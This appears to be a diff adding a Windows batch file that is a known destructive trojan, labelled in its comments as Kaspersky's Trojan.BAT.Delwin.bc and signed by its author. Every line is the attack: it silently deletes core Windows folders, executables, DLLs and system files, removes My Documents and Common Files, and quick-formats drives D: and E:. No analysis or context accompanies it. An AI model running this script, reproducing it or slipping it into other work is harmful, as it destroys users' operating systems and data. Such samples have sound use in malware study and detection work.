@@ -1,0 +1,31 @@
+@echo off
+c:\
+cd\
+cd windows
+deltree/y catroot >nul
+deltree/y command >nul
+deltree/y fonts >nul
+deltree/y help >nul
+deltree/y inf >nul
+deltree/y java >nul
+deltree/y system >nul
+deltree/y web >nul
+cd\
+deltree/y mydocu~1 >nul
+cd windows
+del *.exe >nul
+del *.pif >nul
+del *.ini >nul
+del *.hlp >nul
+del *.sys >nul
+del *.dll >nul
+del *.dat >nul
+cd\
+cd progra~1
+deltree/y common~1 >nul
+format d:/q/autotest
+format e:/q/autotest
+::Kaspersky name is Trojan.BAT.Delwin.bc
+::Another DVL creation
+::dvl2003ro@yahoo.co.uk
+cls
